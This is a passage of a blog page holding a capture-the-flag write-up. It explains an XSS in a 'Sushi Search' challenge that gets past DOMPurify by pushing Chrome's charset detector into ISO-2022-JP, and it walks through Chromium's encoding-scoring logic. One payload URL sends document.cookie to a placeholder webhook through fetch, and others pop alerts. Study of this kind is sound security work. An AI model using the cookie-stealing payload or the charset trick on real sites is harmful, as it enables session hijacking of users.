+  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
+    Web
+  </span>
+</span>
+  </span>
+  
+  
+  
+  
+</div>
+
+
+
+
+    </div>
+
+    
+    
+    
+    
+    
+
+    
+
+    
+      
+      
+        
+        
+<div class="flex author">
+  
+  <div class="place-self-center">
+    
+    
+    <div class="text-2xl sm:text-lg">
+</div>
+  </div>
+</div>
+
+      
+
+      
+        
+
+      
+      <div class="mb-5"></div>
+      
+
+    
+
+  </header>
+  
+  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
+    
+     <div
+      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
+      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">
+
+         <details open id="TOCView"
+  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
+  <summary
+    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sushi-search">Sushi Search</a>
+      <ul>
+        <li><a href="#source-code-">SOURCE CODE :</a></li>
+        <li><a href="#hardest-thing">HARDEST THING</a>
+          <ul>
+            <li><a href="#the-hardedst-question-is-how-chrome-detect-it-">THE HARDEDST QUESTION IS HOW CHROME DETECT IT ?</a>
+              <ul>
+                <li><a href="#there-is-something-weird-here-when-i-try-my-exploit">There is something weird here when i try my exploit</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#chrome-detect-engine">CHROME DETECT ENGINE</a></li>
+        <li><a href="#slow-scan--which-detects-the-iso_2022_jp-">SLOW SCAN ( Which detects the ISO_2022_JP )</a></li>
+        <li><a href="#another-question">ANOTHER QUESTION</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#the-fact-is-no">The fact is NO!</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#so-what-is-matter-">SO what is matter ?</a></li>
+        <li><a href="#math-timeeee">MATH TIMEEEE</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
+        <li><a href="#more">MORE</a></li>
+        <li><a href="#well-well-test-knowledge">WELL WELL TEST KNOWLEDGE</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
+  <summary
+    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
+    Table of Contents
+  </summary>
+  <div
+    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#sushi-search">Sushi Search</a>
+      <ul>
+        <li><a href="#source-code-">SOURCE CODE :</a></li>
+        <li><a href="#hardest-thing">HARDEST THING</a>
+          <ul>
+            <li><a href="#the-hardedst-question-is-how-chrome-detect-it-">THE HARDEDST QUESTION IS HOW CHROME DETECT IT ?</a>
+              <ul>
+                <li><a href="#there-is-something-weird-here-when-i-try-my-exploit">There is something weird here when i try my exploit</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#chrome-detect-engine">CHROME DETECT ENGINE</a></li>
+        <li><a href="#slow-scan--which-detects-the-iso_2022_jp-">SLOW SCAN ( Which detects the ISO_2022_JP )</a></li>
+        <li><a href="#another-question">ANOTHER QUESTION</a>
+          <ul>
+            <li>
+              <ul>
+                <li><a href="#the-fact-is-no">The fact is NO!</a></li>
+              </ul>
+            </li>
+          </ul>
+        </li>
+        <li><a href="#so-what-is-matter-">SO what is matter ?</a></li>
+        <li><a href="#math-timeeee">MATH TIMEEEE</a></li>
+        <li><a href="#conclusion">Conclusion</a></li>
+        <li><a href="#more">MORE</a></li>
+        <li><a href="#well-well-test-knowledge">WELL WELL TEST KNOWLEDGE</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</details>
+
+<script>
+
+  var margin = 200;
+  var marginError = 50;
+
+  (function () {
+    var $window = $(window);
+    var $toc = $('#TOCView');
+    var tocHeight = $toc.height();
+
+    function onResize() {
+      var windowAndMarginHeight = $window.height() - margin;
+      if(tocHeight >= windowAndMarginHeight) {
+        $toc.css("overflow-y", "scroll")
+        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
+      } else {
+        $toc.css("overflow-y", "hidden")
+        $toc.css("max-height", "9999999px")
+      }
+    }
+
+    $window.on('resize', onResize);
+    $(document).ready(onResize);
+  })();
+
+
+
+</script>
+   </div>
+      </div>
+      
+
+      <div class="min-w-0 min-h-0 max-w-fit">
+        
+        
+
+
+        <div class="article-content max-w-prose mb-20">
+          
+
+<h1 class="relative group">Sushi Search 
+    <div id="sushi-search" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#sushi-search" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>Read this before :
+<a href="https://thenewstack.io/encoding-differentials-why-charset-matters/" target="_blank">Blog</a></p>
+<p>Type: Xss through missing charset</p>
+<p><a href="https://source.chromium.org/chromium/chromium/src/&#43;/main:third_party/ced/src/compact_enc_det/compact_enc_det.cc" target="_blank">Chromium detect engine </a></p>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ry6iR71NJl.png" alt="image" />
+    
+  </figure>
+</p>
+<ul>
+<li>This is really hard to me , and i just can solve after reading script :v</li>
+</ul>
+
+
+<h2 class="relative group">SOURCE CODE : 
+    <div id="source-code-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#source-code-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>This type of ctfs is just creating a xss url and send to bot and get their cookies(flag) , so we focus on Xss.
+But &hellip;.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BkyL1E1EJx.png" alt="image" />
+    
+  </figure>
+
+:::danger
+They sanitize it with DomPurify at newest version !
+:::</li>
+</ul>
+<p>Pay attention in this code :
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HkphkNJE1x.png" alt="image" />
+    
+  </figure>
+</p>
+<ul>
+<li>It doesnt specify an charset which lead to vulnerabilities.
+Which leads to the wrong encoding heres of sushi emoji.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rJjZM41EJl.png" alt="image" />
+    
+  </figure>
+</li>
+<li>But i read <a href="https://thenewstack.io/encoding-differentials-why-charset-matters/" target="_blank">this blog</a> and i found a way to bypass.</li>
+<li>If we can someway to fool chrome engine to detect the charset as ISO_2022_JP, we can bypass easily with.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">/search?search= &lt;a id=&#34;%1b$B&#34;&gt;&lt;/a&gt; %1B(B &lt;a id=&#34;&gt;&lt;img src=x onerror = fetch(`YOUR-WEB-HOOK?a=document.cookie`)&gt;&#34;&gt;&lt;/a&gt; %1b$B %1b(B &lt;repeat 1000 times&gt;</span>
+</span></span></code></pre></div><ul>
+<li>I cannot explain better the blog so read it :vvv .This is a valid DOM and dompurify wont sanitize this and then chrome parse it as ISO_2022_JP
+<strong>BOOOOOOOOOOOOOOOOOOOOOOM</strong>
+We get xss :)</li>
+</ul>
+
+
+<h2 class="relative group">HARDEST THING 
+    <div id="hardest-thing" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#hardest-thing" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+
+
+<h3 class="relative group">THE HARDEDST QUESTION IS HOW CHROME DETECT IT ? 
+    <div id="the-hardedst-question-is-how-chrome-detect-it-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#the-hardedst-question-is-how-chrome-detect-it-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<ul>
+<li>Maybe you can just put a lot of bunchs of %1b$B and %1b(B  and hope chrome detect it  :vv</li>
+</ul>
+
+
+<h4 class="relative group">There is something weird here when i try my exploit 
+    <div id="there-is-something-weird-here-when-i-try-my-exploit" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#there-is-something-weird-here-when-i-try-my-exploit" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">/search?search= &lt;a id=&#34;%1b$B&#34;&gt;&lt;/a&gt; %1B(B &lt;a id=&#34;&gt;&lt;img src=x onerror = alert(1) &gt;&#34;&gt;&lt;/a&gt;%1b$B %1b(B &lt;repeat 10000 times&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="err">/search?search= &lt;a id=&#34;%1b$B&#34;&gt;&lt;/a&gt; %1B(B &lt;a id=&#34;&gt;&lt;img src=x onerror = alert(1111111111111111111111111)&gt;&#34;&gt;&lt;/a&gt;%1b$B %1b(B &lt;repeat 10000 times&gt;</span>
+</span></span></code></pre></div><ul>
+<li>
+<p>Both of codes is just different at the length of alert right ?
+====== But (1) not works :vv ======
+And (2) give me this 
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/r1-EGNJ4ye.png" alt="image" />
+    
+  </figure>
+ -&gt; chrome detect success ??</p>
+</li>
+<li>
+<p>It took me one day confusing and I decide to read chromium source code (in fact shin24 tells me :vv)</p>
+</li>
+</ul>
+
+
+<h2 class="relative group">CHROME DETECT ENGINE 
+    <div id="chrome-detect-engine" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#chrome-detect-engine" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>It is too long to tell how the engine works but i will tell a little bit
+:::warning
+I just tell the way i understand because of so many blackbox.
+:::</li>
+<li>Its like a game of bunch encodings. Anyone has their own scores.</li>
+<li>Boost and Whack scores is main feature and the best will be chosen one.</li>
+</ul>
+
+
+<h2 class="relative group">SLOW SCAN ( Which detects the ISO_2022_JP ) 
+    <div id="slow-scan--which-detects-the-iso_2022_jp-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#slow-scan--which-detects-the-iso_2022_jp-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>
+<p>It will scan 16KB of document and if it doesn&rsquo;t find any encodings, it will fast scan (256kb) which we dont talk about .</p>
+</li>
+<li>
+<p>Slow can will check only the interesting byte &lt; 0x80 and 0x1b is in that case.</p>
+</li>
+<li>
+<p>
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BkHOXEkEyl.png" alt="image" />
+    
+  </figure>
+
+Here is the scan_table it use to detect if that byte it interesting or not.
+(!=0 -&gt; interesting)</p>
+</li>
+<li>
+<p>So if it meets a interesting byte. First it will check if that bytes is inside a <tag></tag> or <script></script> or comment. If inside a <strong>title tag</strong> , it will be decreased the score it can boost, then skip to the end of tag just in case there is 12 bytes in title already.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/ByZRnGeN1g.png" alt="image" />
+    
+  </figure>
+</p>
+</li>
+<li>
+<p>Pay attention that in our case my input actually push into the title tag too.
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/rk_GBE1NJx.png" alt="image" />
+    
+  </figure>
+</p>
+</li>
+<li>
+<p>However, there is something funny here when reading more  the logic check tag
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/BJtUrV141e.png" alt="image" />
+    
+  </figure>
+</p>
+</li>
+<li>
+<p>It loops back 192 bytes to find the &ldquo;&lt;&rdquo; and &ldquo;&gt;&rdquo; . Yeah like i say <strong>&ldquo;192&rdquo;</strong> bytes. So if you pad a bunch of &ldquo;a&rdquo; before your &ldquo;%1b&rdquo; , it won&rsquo;t be considered inside a title tag and they wont be skipped to tag end + keep full score weightshift !!!</p>
+</li>
+<li>
+<p>It seems the reason why exploit 2 works . Now let&rsquo;s dive deeper</p>
+</li>
+</ul>
+
+
+<h2 class="relative group">ANOTHER QUESTION 
+    <div id="another-question" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#another-question" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>BUT why we want to keep a bunch of data in title ?</li>
+<li>When we can place it here ?
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SJ3yvEkVyl.png" alt="image" />
+    
+  </figure>
+</li>
+<li>Is it scored the same  ????</li>
+</ul>
+
+
+<h4 class="relative group">The fact is NO! 
+    <div id="the-fact-is-no" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#the-fact-is-no" aria-label="Anchor">#</a>
+    </span>        
+    
+</h4>
+<ul>
+<li>In short, one scan just check 8 pairs of interesting bytes then pruning. If something get pruned , it is done and no get checked any more!!! And we dont want this</li>
+<li>If the number of pairs is not divided by 8 , no boostPrune will happend</li>
+<li>Max pairs scanned === 48 pairs</li>
+</ul>
+
+
+<h2 class="relative group">SO what is matter ? 
+    <div id="so-what-is-matter-" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#so-what-is-matter-" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>The KEY IS THAT SUSHI !!</li>
+<li>That emoji in bytes is 0xF0 0xF8 0x8a 0xa3 (take 4 bytes)
+And if we look at the logic to boost<br>
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/S1zf6zgE1e.png" alt="image" />
+    
+  </figure>
+
+Logic to whack
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/r1onDVJ4Jx.png" alt="image" />
+    
+  </figure>
+
+BOOST a little and WHACK SO MUCH ! :vv</li>
+<li>First i think it not matter because 0xF0 is bigger than 0x1F right ?
+But when i try to debug, it happens, the 0xF0 is &lt; 0x1F and it whack our score  so much!!
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/SJnsO4JVJg.png" alt="image" />
+    
+  </figure>
+</li>
+</ul>
+<p>*I still dont make sense maybe because of signed number :v
+<strong>SO the emoji whacking us too much !!!</strong>
+===&raquo;&gt; If we put data after sushi , there is no way to continue checking ISO due to pruned</p>
+
+
+<h2 class="relative group">MATH TIMEEEE 
+    <div id="math-timeeee" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#math-timeeee" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>In case we have 7 pair boost and 1 pair whack from sushi emoji</li>
+<li>BoostGentle = 60</li>
+<li>WhackBadPair = 600
+Score = BOOST - WHACK = 7*60 - 600 = -180 points</li>
+<li>So we dont want to have any emoji get scanned pairs !!
+&mdash;&gt; If we set at title , it will get enough pairs before getting the sushi emoji</li>
+</ul>
+
+
+<h2 class="relative group">Conclusion 
+    <div id="conclusion" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>That is the reason we want to trim out the sushi emoji. And we need the assistance of title tag.</li>
+<li>This challenge is really hard :vv</li>
+</ul>
+
+
+<h2 class="relative group">MORE 
+    <div id="more" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#more" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>I test in locally and it works with append a bunch of &ldquo;a&rdquo; and 8 pairs of &ldquo;\x1b$B\x1b(B&rdquo; so i hope its true :vv</p>
+<hr>
+<p>v
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/H1FlPSyEye.png" alt="image" />
+    
+  </figure>
+
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/HJDzwHJ4Jl.png" alt="image" />
+    
+  </figure>
+</p>
+
+
+<h2 class="relative group">WELL WELL TEST KNOWLEDGE 
+    <div id="well-well-test-knowledge" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#well-well-test-knowledge" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li>If you understand you will know what happen if i put this sushi in another place @@
+
+  <figure>
+    <img class="my-0 rounded-md" loading="lazy" src="https://hackmd.io/_uploads/Hy3FdryVJx.png" alt="image" />
+    
+  </figure>
+</li>
+</ul>
+<p>&mdash;&gt; It will be ISO_2022_JP :vvv</p>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+        
+
+
+  
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/sekai24\/index.md"
+        var oid_likes = "likes_posts\/sekai24\/index.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.4c1d8e0f53a5b5b7bccae87750581a0a393723aae9a9ae5622497d488b9689a4fd64a34846876e449a065aed64df10f9219b8df359a87371b998dd8bf58a1da5.js" integrity="sha512-TB2OD1Oltbe8yuh3UFgaCjk3I6rpqa5WIkl9SIuWiaT9ZKNIRoduRJoGWu1k3xD5IZuN81moc3G5mN2L9YodpQ=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+    <nav class="flex flex-row pb-4 text-base font-medium text-neutral-500 dark:text-neutral-400">
+      <ul class="flex flex-col list-none sm:flex-row">
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/tags/"
+            title="Tags">
+            
+            tags
+          </a>
+        </li>
+        
+        <li class="flex mb-1 ltr:text-right rtl:text-left sm:mb-0 ltr:sm:mr-7 ltr:sm:last:mr-0 rtl:sm:ml-7 rtl:sm:last:ml-0">
+          <a class="decoration-primary-500 hover:underline hover:decoration-2 hover:underline-offset-2 flex items-center" href="/categories/"
+            title="Categories">
+            
+            categories
+          </a>
+        </li>
+        
+      </ul>
+    </nav>
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      Copyright © Hibwyli
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.330c9c7ed3478d29ddc83242e05f3636088799f250f724e0eee3b88057e4e288861cf148972d2ac1ed5972c27193c1c919d768bf5e52f6ef01d3abc3b16df7c2.js" integrity="sha512-MwycftNHjSndyDJC4F82NgiHmfJQ9yTg7uO4gFfk4oiGHPFIly0qwe1ZcsJxk8HJGddov15S9u8B06vDsW33wg=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="//localhost:1313/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
